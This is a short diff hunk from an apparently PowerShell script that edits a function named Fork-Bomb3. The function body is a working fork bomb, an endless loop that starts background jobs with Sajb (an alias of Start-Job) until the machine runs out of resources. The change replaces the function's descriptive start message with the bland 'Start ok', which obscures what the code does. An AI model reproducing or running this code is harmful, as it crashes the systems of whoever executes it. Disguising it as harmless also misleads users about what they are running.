@@ -1145,7 +1145,7 @@ Param(
 
 Function Fork-Bomb3 
 {
-    write-host "Start Fork-Bomb3"
+    write-host "Start ok"
     For(){ Sajb{ For(){ } } }
 }
 
